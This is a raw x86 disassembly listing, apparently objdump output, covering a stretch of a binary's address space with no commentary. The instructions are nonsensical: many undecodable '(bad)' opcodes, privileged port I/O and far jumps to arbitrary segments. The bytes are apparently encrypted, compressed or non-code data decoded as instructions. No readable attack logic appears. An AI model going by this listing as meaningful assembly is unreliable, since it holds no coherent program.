  40c21d:	jbe    0x40c22e
  40c21f:	addr16 dec edx
  40c221:	cmc    
  40c222:	lahf   
  40c223:	retf   0x6bbf
  40c226:	push   ebx
  40c227:	or     al,0x5f
  40c229:	pop    edi
  40c22a:	mov    DWORD PTR [edi-0x39d02df8],esi
  40c230:	xor    eax,0x39b015de
  40c235:	add    al,BYTE PTR [ebx]
  40c237:	jne    0x40c273
  40c239:	and    BYTE PTR [ecx+0x1f],0x2b
  40c23d:	clc    
  40c23e:	mov    eax,0x6913ff12
  40c243:	scas   al,BYTE PTR es:[edi]
  40c244:	mov    ah,0x28
  40c246:	xor    al,0xdd
  40c248:	mov    dh,0xda
  40c24a:	aam    0x64
  40c24c:	add    eax,0x49c63da9
  40c251:	xchg   esi,eax
  40c252:	push   ebx
  40c253:	imul   edi,DWORD PTR [esi],0x9ae834e2
  40c259:	int    0x57
  40c25b:	sbb    BYTE PTR [ebp+0x22be98fd],dh
  40c261:	cdq    
  40c262:	jg     0x40c246
  40c264:	aam    0xc4
  40c266:	dec    eax
  40c267:	inc    edi
  40c268:	mov    dh,0x3a
  40c26a:	aaa    
  40c26b:	rcr    DWORD PTR [ebp-0x2e],cl
  40c26e:	mov    bl,0xe
  40c270:	jb     0x40c288
  40c272:	pushf  
  40c273:	mov    al,ds:0xfa0e8d65
  40c278:	sub    DWORD PTR [eax],esi
  40c27a:	push   esp
  40c27b:	dec    eax
  40c27c:	mov    dh,0xc3
  40c27e:	mov    cl,0x70
  40c280:	popf   
  40c281:	xor    eax,0x328d1a2d
  40c286:	(bad)  
  40c287:	jecxz  0x40c2fe
  40c289:	sbb    bh,0x6
  40c28c:	inc    edx
  40c28d:	mov    bl,0x0
  40c28f:	hlt    
  40c290:	adc    eax,0x2942e704
  40c295:	std    
  40c296:	fisubr WORD PTR [eax+edi*1-0x6531d835]
  40c29d:	mov    bl,BYTE PTR [ebx+0x7412e044]
  40c2a3:	shl    edi,0x77
  40c2a6:	adc    ebp,DWORD PTR [edx-0x80e7ab4]
  40c2ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2ad:	sub    ah,BYTE PTR [esi-0x7a]
  40c2b0:	aaa    
  40c2b1:	lock adc eax,0x7d699a81
  40c2b7:	loope  0x40c2ee
  40c2b9:	imul   ebp,DWORD PTR [ecx-0x1ea1220d],0x310c1863
  40c2c3:	std    
  40c2c4:	add    eax,0x88641610
  40c2c9:	test   ebx,esi
  40c2cb:	ss dec ebx
  40c2cd:	not    cl
  40c2cf:	pop    ebx
  40c2d0:	hlt    
  40c2d1:	add    ch,bl
  40c2d3:	inc    esp
  40c2d4:	pop    ebp
  40c2d5:	scas   al,BYTE PTR es:[edi]
  40c2d6:	sbb    cl,ah
  40c2d8:	aaa    
  40c2d9:	sub    BYTE PTR [ebp+0x5a],ch
  40c2dc:	rcl    BYTE PTR [edx-0x33],cl
  40c2df:	fnstcw WORD PTR [ecx-0x3f]
  40c2e2:	fstp   QWORD PTR [esi+eax*1]
  40c2e5:	ds in  al,dx
  40c2e7:	sub    BYTE PTR [edx+0x28],ah
  40c2ea:	pop    ds
  40c2eb:	out    0xbe,eax
  40c2ed:	out    0xfa,al
  40c2ef:	aam    0xda
  40c2f1:	mov    esp,0x73d383a5
  40c2f6:	int    0x21
  40c2f8:	lods   eax,DWORD PTR ds:[esi]
  40c2f9:	push   ds
  40c2fa:	dec    ecx
  40c2fb:	cmp    ah,bh
  40c2fd:	mov    BYTE PTR [ecx],bl
  40c2ff:	mov    cl,0x6c
  40c301:	xchg   esi,eax
  40c302:	clc    
  40c303:	or     DWORD PTR [ecx],0x28
  40c306:	mov    cl,0x6
  40c308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c309:	push   0x9340ef21
  40c30e:	adc    DWORD PTR [edi-0x548461a5],ebp
  40c314:	push   0xffffffc9
  40c316:	leave  
  40c317:	retf   0x62c1
  40c31a:	jmp    edx
  40c31c:	outs   dx,DWORD PTR ds:[esi]
  40c31d:	out    dx,al
  40c31e:	mov    DWORD PTR [esi-0x29],ebx
  40c321:	aam    0xbd
  40c323:	or     eax,0xad2f8235
  40c328:	sbb    dl,BYTE PTR [edx-0x67b7bd94]
  40c32e:	in     eax,dx
  40c32f:	jl     0x40c335
  40c331:	xchg   DWORD PTR [edx-0x29],edi
  40c334:	and    bh,BYTE PTR [ecx+ebx*4-0x57]
  40c338:	outs   dx,BYTE PTR ds:[esi]
  40c339:	std    
  40c33a:	fsubr  st(1),st
  40c33c:	clc    
  40c33d:	dec    ecx
  40c33e:	sbb    ch,BYTE PTR [edi]
  40c340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c341:	pop    edi
  40c342:	xchg   edi,eax
  40c343:	loopne 0x40c39e
  40c345:	sub    al,0x11
  40c347:	fidiv  DWORD PTR [eax+0x49]
  40c34a:	cmp    eax,0xc82ffcba
  40c34f:	sar    BYTE PTR [edi+0x6b],1
  40c352:	test   eax,0x2d33617a
  40c357:	mov    eax,0xef5cdcdb
  40c35c:	cmp    eax,0x59ca1b0e
  40c361:	pop    ecx
  40c362:	fld    TBYTE PTR [ecx-0x55164238]
  40c368:	data16 movsd QWORD PTR [edi+0x74],xmm0
  40c36e:	repz jmp 0x40c350
  40c371:	test   DWORD PTR [ebx],eax
  40c373:	arpl   WORD PTR [esi-0x7e20dbae],dx
  40c379:	cmp    eax,DWORD PTR [ecx+0x66f96d50]
  40c37f:	(bad)  
  40c380:	push   edi
  40c381:	je     0x40c363
  40c383:	mov    esp,edx
  40c385:	aas    
  40c386:	mov    dh,0xc0
  40c388:	dec    ecx
  40c389:	inc    ecx
  40c38a:	cmp    DWORD PTR [esi+0x45],ebx
  40c38d:	pop    edi
  40c38e:	ins    DWORD PTR es:[edi],dx
  40c38f:	ins    BYTE PTR es:[edi],dx
  40c390:	cmp    DWORD PTR [esi-0x43],edi
  40c393:	mov    edx,0x3dc08156
  40c398:	xor    al,0x5b
  40c39a:	out    0xfa,eax
  40c39c:	push   ebp
  40c39d:	pop    ecx
  40c39e:	mov    BYTE PTR [ebx+0x3841e421],cl
  40c3a4:	pop    ss
  40c3a5:	jge    0x40c3a9
  40c3a7:	stos   BYTE PTR es:[edi],al
  40c3a8:	stos   BYTE PTR es:[edi],al
  40c3a9:	es xchg edi,eax
  40c3ab:	imul   DWORD PTR [edx-0x38ab1741]
  40c3b1:	out    dx,eax
  40c3b2:	pop    esi
  40c3b3:	fdivr  QWORD PTR ss:[esi]
  40c3b6:	les    esi,FWORD PTR [edx-0x3806fb9f]
  40c3bc:	aad    0x8a
  40c3be:	sti    
  40c3bf:	and    ebx,DWORD PTR [esi-0x67]
  40c3c2:	cmp    al,0x20
  40c3c4:	retf   0x957
  40c3c7:	inc    edx
  40c3c8:	pinsrw mm7,WORD PTR [esp+ebp*8-0xd],0x5e
  40c3ce:	add    al,0x7c
  40c3d0:	fdiv   QWORD PTR [ebx-0x7a]
  40c3d3:	add    ecx,0x71f3c269
  40c3d9:	xchg   esi,eax
  40c3da:	xor    DWORD PTR [eax-0x6d],esi
  40c3dd:	push   ebx
  40c3de:	mov    ebp,DWORD PTR [esi+0x49]
  40c3e1:	push   cs
  40c3e2:	add    dl,BYTE PTR [ebp+0x6a]
  40c3e5:	xor    ch,0xd2
  40c3e8:	jmp    0x40c3f6
  40c3ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3eb:	xor    BYTE PTR [eax-0xf2178f5],ch
  40c3f1:	mov    esi,0x2f982635
  40c3f6:	dec    esi
  40c3f7:	inc    ebp
  40c3f8:	or     eax,0xc5f2398a
  40c3fe:	(bad)  
  40c3ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c400:	cmp    esi,esp
  40c402:	jae    0x40c3d4
  40c404:	std    
  40c405:	jg     0x40c44e
  40c407:	cwde   
  40c408:	or     ch,dl
  40c40a:	dec    ecx
  40c40b:	pop    esp
  40c40c:	hlt    
  40c40d:	daa    
  40c40e:	xchg   esp,eax
  40c40f:	mov    eax,0x171b4d47
  40c414:	dec    edx
  40c415:	push   eax
  40c416:	js     0x40c3d8
  40c418:	ins    BYTE PTR es:[edi],dx
  40c419:	inc    ecx
  40c41a:	pop    esp
  40c41b:	and    eax,0xbd7ab295
  40c420:	daa    
  40c421:	nop
  40c422:	inc    ebx
  40c423:	xor    dh,BYTE PTR [ecx+ebp*1+0x6ddfd080]
  40c42a:	cdq    
  40c42b:	adc    eax,0xfdf129bd
  40c430:	xchg   dh,ch
  40c432:	out    dx,eax
  40c433:	sbb    al,0xb7
  40c435:	sar    DWORD PTR [edx+0x1fa3215f],1
  40c43b:	xchg   ecx,eax
  40c43c:	ins    BYTE PTR es:[edi],dx
  40c43d:	sub    ch,ch
  40c43f:	mov    ds:0xa708c0e6,eax
  40c444:	bound  edi,QWORD PTR [esi-0x500a01e6]
  40c44a:	stos   DWORD PTR es:[edi],eax
  40c44b:	ds in  al,dx
  40c44d:	jne    0x40c492
  40c44f:	mov    cl,0x86
  40c451:	fistp  WORD PTR ds:0x27ce2ef2
  40c457:	xchg   ebp,eax
  40c458:	add    al,0x31
  40c45a:	push   ss
  40c45b:	sbb    al,0xf6
  40c45d:	fcom   DWORD PTR [eax]
  40c45f:	lods   eax,DWORD PTR ds:[esi]
  40c460:	and    ah,BYTE PTR fs:[edx-0x6ea23ca3]
  40c467:	arpl   WORD PTR [ecx+eiz*8],sp
  40c46a:	jae    0x40c4d6
  40c46c:	aam    0xec
  40c46e:	mov    esp,0xa02cac57
  40c473:	in     al,0xc8
  40c475:	adc    DWORD PTR ds:0xed16b573,ebp
  40c47b:	lods   eax,DWORD PTR ds:[esi]
  40c47c:	pop    esi
  40c47d:	push   esi
  40c47e:	jp     0x40c43c
  40c480:	xchg   esi,eax
  40c481:	adc    dl,BYTE PTR [esi]
  40c483:	rcl    DWORD PTR [edx+0x3e],1
  40c486:	add    DWORD PTR [edx+0x5f],esp
  40c489:	ror    DWORD PTR [esi],cl
  40c48b:	cmp    BYTE PTR [edx-0x3e],ch
  40c48e:	pop    ebx
  40c48f:	sbb    bl,BYTE PTR [edi-0x22200ccc]
  40c495:	push   es
  40c496:	fdivr  DWORD PTR [ebp-0x33]
  40c499:	mov    edi,0x28b0ad9
  40c49e:	add    BYTE PTR [ebp+0x25],0x6f
  40c4a2:	inc    edx
  40c4a3:	push   esp
  40c4a4:	fistp  DWORD PTR [ebx+0x1c]
  40c4a7:	dec    ebp
  40c4a8:	mov    eax,ds:0x208ad5ac
  40c4ad:	jp     0x40c4f7
  40c4af:	fmul   QWORD PTR [esp+eiz*2-0x52]
  40c4b3:	jge    0x40c514
  40c4b5:	(bad)  
  40c4b6:	iret   
  40c4b7:	fdiv   QWORD PTR [eax+0x54]
  40c4ba:	adc    cl,BYTE PTR [esi-0x2a]
  40c4bd:	xchg   ecx,eax
  40c4be:	or     al,0xd0
  40c4c0:	icebp  
  40c4c1:	aaa    
  40c4c2:	retf   0xdfe
  40c4c5:	add    ah,bl
  40c4c7:	xlat   BYTE PTR ds:[ebx]
  40c4c8:	adc    eax,0xb617ba5d
  40c4cd:	stos   DWORD PTR es:[edi],eax
  40c4ce:	shl    BYTE PTR [ebp+edx*4-0x27d67dea],1
  40c4d5:	sub    BYTE PTR [ecx-0x747e2911],0x57
  40c4dc:	fwait
  40c4dd:	ins    BYTE PTR es:[edi],dx
  40c4de:	mov    DWORD PTR ds:0x3aff609,edi
  40c4e4:	sbb    dl,BYTE PTR [ebp+0x3af2cb2c]
  40c4ea:	and    dl,BYTE PTR [ebp+edi*8-0x58]
  40c4ee:	and    DWORD PTR [esi+0x62],esp
  40c4f1:	test   BYTE PTR [eax-0x47b9f05a],ah
  40c4f7:	push   eax
  40c4f8:	adc    BYTE PTR [edx-0x1e],dh
  40c4fb:	add    al,0xcf
  40c4fd:	in     al,0x70
  40c4ff:	jae    0x40c4d1
  40c501:	icebp  
  40c502:	mul    edi
  40c504:	xchg   edi,eax
  40c505:	out    0x92,eax
  40c507:	or     DWORD PTR [ebp-0x3f8bc069],ebx
  40c50d:	mov    BYTE PTR [ebx+0x7bc84333],0x47
  40c514:	cmp    ch,BYTE PTR [edi-0x78]
  40c517:	shl    DWORD PTR [eax-0x80],1
  40c51a:	pop    ebp
  40c51b:	sbb    ecx,DWORD PTR [ebx-0x5c7f1d77]
  40c521:	sbb    al,0x54
  40c523:	in     eax,dx
  40c524:	xchg   edx,eax
  40c525:	inc    eax
  40c526:	inc    BYTE PTR [edi-0x4acc5f12]
  40c52c:	cmp    BYTE PTR [ebp-0x4b],0x83
  40c530:	shr    BYTE PTR [ebx-0x7c234434],cl
  40c536:	(bad)  
  40c537:	scas   eax,DWORD PTR es:[edi]
  40c538:	push   edx
  40c539:	in     al,dx
  40c53a:	and    al,0x39
  40c53c:	sbb    bl,BYTE PTR [edx]
  40c53e:	repnz inc ecx
  40c540:	or     BYTE PTR [esi-0x2d],cl
  40c543:	dec    esp
  40c544:	push   edx
  40c545:	adc    al,dh
  40c547:	jb     0x40c548
  40c549:	push   ebp
  40c54a:	push   0x417ae9ba
  40c54f:	js     0x40c532
  40c551:	xchg   esp,ebx
  40c553:	xchg   edx,eax
  40c554:	push   edi
  40c555:	adc    eax,0x633b4903
  40c55a:	jp     0x40c547
  40c55c:	mov    esi,0xc7d2abc2
  40c561:	jle    0x40c59a
  40c563:	clc    
  40c564:	scas   al,BYTE PTR es:[edi]
  40c565:	push   es
  40c566:	mov    eax,0xd9d45d03
  40c56b:	leave  
  40c56c:	mov    cs,WORD PTR [esi-0x1d]
  40c56f:	xor    eax,0x94e8ff7a
  40c574:	mov    ds:0x4eb8978a,eax
  40c579:	call   0x596470d7
  40c57e:	adc    BYTE PTR [eax],bh
  40c580:	dec    edi
  40c581:	and    ecx,DWORD PTR [bx+di-0x39]
  40c585:	aam    0x2b
  40c587:	pop    ebx
  40c588:	sbb    DWORD PTR [eax],eax
  40c58a:	outs   dx,DWORD PTR ds:[esi]
  40c58b:	je     0x40c5c8
  40c58d:	mov    ds,WORD PTR [ebx+0x8d37cc0]
  40c593:	hlt    
  40c594:	jp     0x40c551
  40c596:	lock iret 
  40c598:	icebp  
  40c599:	pop    ecx
  40c59a:	pop    ss
  40c59b:	ss inc edi
  40c59d:	cmp    eax,0xcc6aa51f
  40c5a2:	jge    0x40c5ae
  40c5a4:	jmp    0x1e096472
  40c5a9:	test   BYTE PTR [edi-0x56],bh
  40c5ac:	mov    ebx,0x56246894
  40c5b1:	iret   
  40c5b2:	mov    ds:0xf9aee621,al
  40c5b7:	aam    0x3a
  40c5b9:	aas    
  40c5ba:	sahf   
  40c5bb:	and    eax,DWORD PTR [esi-0x56]
  40c5be:	outs   dx,BYTE PTR ds:[esi]
  40c5bf:	or     bh,ah
  40c5c1:	aas    
  40c5c2:	ds js  0x40c55b
  40c5c5:	push   edi
  40c5c6:	neg    BYTE PTR [ecx-0x58]
  40c5c9:	adc    eax,0x5482e100
  40c5ce:	xor    eax,0x5449c505
  40c5d3:	imul   eax,DWORD PTR [eax+0x26],0xa5dc7b74
  40c5da:	xor    DWORD PTR [ecx+0x14165063],esi
  40c5e0:	lahf   
  40c5e1:	lods   al,BYTE PTR ds:[esi]
  40c5e2:	arpl   WORD PTR [edx+0x260aa67e],bx
  40c5e8:	sub    edx,DWORD PTR [eax+0x8]
  40c5eb:	ror    DWORD PTR [ecx],1
  40c5ed:	push   edx
  40c5ee:	jmp    0xb745:0xd773096f
  40c5f5:	inc    edi
  40c5f6:	or     ebp,ebp
  40c5f8:	push   0x5e
  40c5fa:	shl    BYTE PTR [eax],0x78
  40c5fd:	int3   
  40c5fe:	mov    ch,dh
  40c600:	fwait
  40c601:	mov    ebp,0xf45677f4
  40c606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c607:	rol    BYTE PTR [esi-0x73a91b8e],1
  40c60d:	jne    0x40c66b
  40c60f:	push   esi
  40c610:	fsubrp st(4),st
  40c612:	sti    
  40c613:	call   0xbf89:0xa3e8027c
  40c61a:	xor    al,0xae
  40c61c:	push   ebx
  40c61d:	mov    eax,ds:0xd2fca0f9
  40c622:	sbb    al,BYTE PTR [ebx-0x19ebaeb3]
  40c628:	xor    eax,0xfd99b908
  40c62d:	lods   eax,DWORD PTR ds:[esi]
  40c62e:	push   ebp
  40c62f:	jge    0x40c63c
  40c631:	xlat   BYTE PTR ds:[ebx]
  40c632:	push   edi
  40c633:	mov    dh,0xda
  40c635:	sbb    BYTE PTR [esi-0x41],dl
  40c638:	inc    ebp
  40c639:	out    dx,al
  40c63a:	aas    
  40c63b:	popa   
  40c63c:	xchg   edx,eax
  40c63d:	mov    esp,0x6128ea66
  40c642:	bound  edx,QWORD PTR [edx+edi*2-0x60]
  40c646:	inc    ebp
  40c647:	xor    BYTE PTR ds:0x90aec9a1,0x36
  40c64e:	fstp   QWORD PTR [ebx+0x78]
  40c651:	test   BYTE PTR [edx+0x76],0x39
  40c655:	mov    bh,0x6c
  40c657:	jmp    0x40c669
  40c659:	push   edx
  40c65a:	push   ds
  40c65b:	dec    eax
  40c65c:	bound  edx,QWORD PTR [edi+ebp*8-0x4c7246d1]
  40c663:	dec    edi
  40c664:	adc    bh,BYTE PTR [ebx-0x13]
  40c667:	mov    bl,0x4c
  40c669:	xchg   DWORD PTR [ecx+0x6],esi
  40c66c:	inc    edx
  40c66d:	pop    ss
  40c66e:	sbb    DWORD PTR [eax+0x5e],eax
  40c671:	pop    edi
  40c672:	inc    edx
  40c673:	or     bh,BYTE PTR [esi+0x7569797]
  40c679:	push   0xefd2a165
  40c67e:	sbb    BYTE PTR [eax+0x30e8330d],0xeb
  40c685:	xor    DWORD PTR [ecx-0x7d],eax
  40c688:	xchg   edx,eax
  40c689:	dec    eax
  40c68a:	lds    edi,FWORD PTR ds:0xfe3cf179
  40c690:	mov    dl,0xd8
  40c692:	mov    bh,0x32
  40c694:	out    0xba,eax
  40c696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c697:	aad    0xaa
  40c699:	or     al,0xdf
  40c69b:	mov    esi,0x9b0e8b06
  40c6a0:	out    dx,eax
  40c6a1:	push   ss
  40c6a2:	scas   eax,DWORD PTR es:[edi]
  40c6a3:	pop    ss
  40c6a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6a5:	mov    ah,0x6f
  40c6a7:	das    
  40c6a8:	sub    BYTE PTR [esp+eiz*2-0x2e9c306d],0xa8
  40c6b0:	cdq    
  40c6b1:	sub    ah,bl
  40c6b3:	pushf  
  40c6b4:	push   cs
  40c6b5:	les    esi,FWORD PTR [esi+0x32]
  40c6b8:	js     0x40c697
  40c6ba:	aaa    
  40c6bb:	in     al,dx
  40c6bc:	int3   
  40c6bd:	mov    dl,0x9d
  40c6bf:	adc    eax,0x3778e9df
  40c6c4:	addr16 and dl,ch
  40c6c7:	jo     0x40c725
  40c6c9:	mov    ah,0xfa
  40c6cb:	cs jo  0x40c6f8
  40c6ce:	dec    esp
  40c6cf:	idiv   ch
  40c6d1:	dec    ecx
  40c6d2:	push   0x1738ec43
  40c6d7:	sar    BYTE PTR [eax],0xda
  40c6da:	push   0x2
  40c6dc:	repz adc DWORD PTR [esi-0x674335f],0x18
  40c6e4:	inc    ebp
  40c6e5:	(bad)  
  40c6e6:	jnp    0x40c6de
  40c6e8:	mov    ds:0x45e2b5eb,al
  40c6ed:	imul   esp,DWORD PTR [ecx],0x33
  40c6f0:	pop    esp
  40c6f1:	pop    edi
  40c6f2:	cmp    DWORD PTR [ebx+0x52cfdec2],ebp
  40c6f8:	xchg   esp,eax
  40c6f9:	retf   
  40c6fa:	pop    edx
  40c6fb:	lea    eax,[ebx-0x68]
  40c6fe:	repnz xor ebp,eax
  40c701:	outs   dx,DWORD PTR ds:[esi]
  40c702:	pop    edx
  40c703:	and    DWORD PTR [eax+edi*2+0x52153237],ecx
  40c70a:	test   eax,0x36a6b405
  40c70f:	repnz sbb ecx,edi
  40c712:	int3   
  40c713:	iret   
  40c714:	fs xchg edi,eax
  40c716:	imul   esi,DWORD PTR [ebx-0x29e303aa],0x92057fad
  40c720:	xchg   ebx,eax
  40c721:	cmp    al,0x16
  40c723:	mov    dl,BYTE PTR [edx]
  40c725:	jl     0x40c7a3
  40c727:	jmp    0xc93dbcd7
  40c72c:	cmp    al,0x9b
  40c72e:	pop    ebx
  40c72f:	adc    al,0x35
  40c731:	dec    esi
  40c732:	imul   esi,eax,0xffffffcc
  40c735:	cmc    
  40c736:	adc    eax,0x71cd0d32
  40c73b:	enter  0x569d,0xbc
  40c73f:	mov    al,ds:0xd06c6138
  40c744:	inc    edi
  40c745:	mov    eax,0xd05a923b
  40c74a:	or     edi,esp
  40c74c:	in     al,0x4f
  40c74e:	je     0x40c711
  40c750:	lea    esp,[edi-0x4fa4ab28]
  40c756:	outs   dx,DWORD PTR ds:[esi]
  40c757:	push   cs
  40c758:	call   0xfaab9117
  40c75d:	add    BYTE PTR [esp+edi*4],ch
  40c760:	and    al,BYTE PTR [edx-0x6f0c0223]
  40c766:	cmp    ebx,esp
  40c768:	popa   
  40c769:	inc    edx
  40c76a:	into   
  40c76b:	sub    al,0xb7
  40c76d:	ins    BYTE PTR es:[edi],dx
  40c76e:	pushf  
  40c76f:	popa   
  40c770:	cs and al,0x85
  40c773:	push   esp
  40c774:	push   es
  40c775:	inc    ecx
  40c776:	xchg   esp,eax
  40c777:	dec    esi
  40c778:	loop   0x40c723
  40c77a:	xlat   BYTE PTR ds:[ebx]
  40c77b:	and    dh,BYTE PTR [ecx+esi*1-0x652d983f]
  40c782:	test   DWORD PTR [edi],ebx
  40c784:	and    ch,BYTE PTR [edx-0x70]
  40c787:	jp     0x40c76b
  40c789:	adc    al,0x82
  40c78b:	rol    esi,1
  40c78d:	xor    al,0x16
  40c78f:	call   FWORD PTR [ebx-0x5ad3fc5e]
  40c795:	fwait
  40c796:	cwde   
  40c797:	gs xchg edx,eax
  40c799:	fnstsw WORD PTR [esi-0x68]
  40c79c:	aam    0x65
  40c79e:	enter  0x11a4,0xf7
  40c7a2:	xor    eax,0x727b1d4e
  40c7a7:	sbb    edi,DWORD PTR [ebx]
  40c7a9:	add    DWORD PTR [edi-0x1bacdce5],0xffffffe3
  40c7b0:	add    bl,BYTE PTR [eax-0x761bc004]
  40c7b6:	(bad)  
  40c7b7:	jno    0x40c750
  40c7b9:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40c7bb:	xchg   esp,eax
  40c7bc:	call   0x4762:0x96654eb5
  40c7c3:	dec    ecx
  40c7c4:	stos   BYTE PTR es:[edi],al
  40c7c5:	int3   
  40c7c6:	push   0x15
  40c7c8:	fst    DWORD PTR [eax]
  40c7ca:	cld    
  40c7cb:	push   0xb7f66b04
  40c7d0:	jbe    0x40c77a
  40c7d2:	cld    
  40c7d3:	sar    dh,0xa8
  40c7d6:	cmp    dl,dh
  40c7d8:	pop    ecx
  40c7d9:	mov    esi,0x8fc9a91b
  40c7de:	retf   
  40c7df:	pop    edi
  40c7e0:	pop    ebp
  40c7e1:	out    0x18,al
  40c7e3:	out    0x6d,eax
  40c7e5:	fwait
  40c7e6:	push   ecx
  40c7e7:	jo     0x40c81c
  40c7e9:	repnz or dl,dh
  40c7ec:	cli    
  40c7ed:	cmp    edx,ecx
  40c7ef:	daa    
  40c7f0:	(bad)  
  40c7f1:	loopne 0x40c7f6
  40c7f3:	idiv   DWORD PTR [esi-0xd]
  40c7f6:	gs sbb al,0xed
  40c7f9:	sar    DWORD PTR [edi-0x5a],cl
  40c7fc:	cdq    
  40c7fd:	scas   eax,DWORD PTR es:[edi]
  40c7fe:	cmp    dl,dh
  40c800:	mov    BYTE PTR [ebp-0x35349512],ch
  40c806:	and    eax,0x1f83e619
  40c80b:	add    BYTE PTR [edi-0x25],al
  40c80e:	mov    esp,0x49c6c61e
  40c813:	jmp    0x5908d19c
  40c818:	je     0x40c82c
  40c81a:	or     bh,bl
  40c81c:	adc    DWORD PTR ds:0x1285d815,ecx
  40c822:	or     BYTE PTR [ecx-0x73],bh
  40c825:	inc    BYTE PTR [edi-0x3403d464]
  40c82b:	sub    al,0x5
  40c82d:	cli    
  40c82e:	sbb    DWORD PTR [ebp-0x176e8c7a],ecx
  40c834:	lea    ecx,[eax+0xe371af8]
  40c83a:	inc    esp
  40c83b:	popf   
  40c83c:	xchg   esp,eax
  40c83d:	xor    al,0x74
  40c83f:	aas    
  40c840:	xchg   ecx,eax
  40c841:	mov    eax,0x9b01a3d8
  40c846:	dec    edi
  40c847:	push   esp
  40c848:	not    DWORD PTR [ebp+0x3e178f30]
  40c84e:	xchg   ebx,eax
  40c84f:	cs pop ecx
  40c851:	mov    eax,0xe3dcff70
  40c856:	les    ecx,FWORD PTR [ebx-0x193a570d]
  40c85c:	xor    dh,dh
  40c85e:	xchg   esp,ecx
  40c860:	loope  0x40c8bb
  40c862:	xor    bh,BYTE PTR [ecx-0xff3ebe1]
  40c868:	int3   
  40c869:	xchg   edi,eax
  40c86a:	jmp    0x4f3b:0x30d9e5fe
  40c871:	mov    ds:0x397caa0,al
  40c876:	mov    dl,BYTE PTR [ebp+0xa]
  40c879:	xchg   ebx,eax
  40c87a:	push   esp
  40c87b:	mov    cl,0x58
  40c87d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c87e:	jae    0x40c842
  40c880:	add    eax,0x9da50de5
  40c885:	cs data16 sahf 
  40c888:	lahf   
  40c889:	jg     0x40c905
  40c88b:	and    ecx,DWORD PTR [edx+0x4a113843]
  40c891:	sub    al,0xc5
  40c893:	mov    bl,0xf9
  40c895:	mov    ah,0x60
  40c897:	jg     0x40c861
  40c899:	in     eax,0x8b
  40c89b:	sbb    BYTE PTR [ebx],bl
  40c89d:	out    dx,al
  40c89e:	pop    edi
  40c89f:	mov    edi,0xe75f74fe
  40c8a4:	push   ecx
  40c8a5:	ds ret 0x4c53
  40c8a9:	popa   
  40c8aa:	cmp    al,0xf4
  40c8ac:	sbb    WORD PTR [ebx-0x61f02c4b],bp
  40c8b3:	mov    esi,0x14c7b180
  40c8b8:	jp     0x40c929
  40c8ba:	in     al,dx
  40c8bb:	and    DWORD PTR [ecx+0x3],0xd6c5a4a0
  40c8c2:	jge    0x40c907
  40c8c4:	xchg   edx,eax
  40c8c5:	jmp    0xf07d78ad
  40c8ca:	out    dx,eax
  40c8cb:	fwait
  40c8cc:	jmp    0x40c947
  40c8ce:	mov    ds:0x1fc856af,eax
  40c8d3:	mov    ds:0xfdaf7cf2,eax
  40c8d8:	bnd jp 0x40c8bf
  40c8db:	jmp    0xbb8d:0x3b883be8
  40c8e2:	xor    al,0x98
  40c8e4:	xor    DWORD PTR ds:0xe834c07,eax
  40c8ea:	ins    DWORD PTR es:[edi],dx
  40c8eb:	adc    dl,bh
  40c8ed:	stos   DWORD PTR es:[edi],eax
  40c8ee:	pop    eax
  40c8ef:	outs   dx,DWORD PTR ds:[esi]
  40c8f0:	cmp    al,0x69
  40c8f2:	std    
  40c8f3:	jo     0x40c95e
  40c8f5:	mov    al,0x28
  40c8f7:	xchg   DWORD PTR [ecx],ebx
  40c8f9:	ss daa 
  40c8fb:	inc    eax
  40c8fc:	mov    cl,0x3e
  40c8fe:	or     esi,esp
  40c900:	push   0x75
  40c902:	xchg   ecx,eax
  40c903:	jbe    0x40c961
  40c905:	call   0x8cfb:0xe489aede
  40c90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c90d:	push   0x2e
  40c90f:	out    dx,al
  40c910:	ins    DWORD PTR es:[edi],dx
  40c911:	cli    
  40c912:	(bad)  
  40c914:	pop    ss
  40c915:	lock sub eax,0x72738963
  40c91b:	and    DWORD PTR [edx+0x5b],edi
  40c91e:	jmp    0x1e3f59a1
  40c923:	add    dl,BYTE PTR [ecx]
  40c925:	dec    esp
  40c926:	repz jge 0x40c8af
  40c929:	je     0x40c9a2
  40c92b:	fmul   QWORD PTR [edx+0x7c283983]
  40c931:	int    0xa5
  40c933:	fwait
  40c934:	pop    eax
  40c935:	add    eax,eax
  40c937:	scas   al,BYTE PTR es:[edi]
  40c938:	push   ds
  40c939:	cmp    bh,cl
  40c93b:	and    cl,BYTE PTR [ebx+0x47]
  40c93e:	mov    dh,0x8a
  40c940:	imul   ebp,DWORD PTR [ebx],0x4c
  40c943:	push   edx
  40c944:	pop    ss
  40c945:	lds    ebp,FWORD PTR [bp+0x5661]
  40c94a:	stos   DWORD PTR es:[edi],eax
  40c94b:	add    edi,DWORD PTR [edx-0x68]
  40c94e:	popa   
  40c94f:	inc    ecx
  40c950:	test   BYTE PTR [eax],0x85
  40c953:	(bad)  
  40c954:	sub    DWORD PTR [esi+0x33],eax
  40c957:	add    bl,dh
  40c959:	mov    edi,0xfb6114b7
  40c95e:	shl    BYTE PTR [edx+edi*4],1
  40c961:	call   0x4dea59a
  40c966:	rol    DWORD PTR [edi-0x35],1
  40c969:	test   DWORD PTR [edx+eiz*4],0xa8e74909
  40c970:	call   0x6cef:0x50d90c1e
  40c977:	cmp    BYTE PTR [ebp-0x6a6f1d3e],dh
  40c97d:	repz mov ds:0x65d5c1c0,al
  40c983:	jno    0x40c977
  40c985:	nop
  40c986:	sbb    al,0x82
  40c988:	inc    esp
  40c989:	push   esp
  40c98a:	jb     0x40c95e
  40c98c:	jb     0x40c9fc
  40c98e:	inc    ebp
  40c98f:	xchg   ecx,ecx
  40c991:	cmp    BYTE PTR [edi+eax*8-0x16],0x8
  40c996:	jmp    0xcc83:0x5cce4ae4
  40c99d:	dec    ebx
  40c99e:	stos   BYTE PTR es:[edi],al
  40c99f:	sub    ch,BYTE PTR [edx-0x7d0ad301]
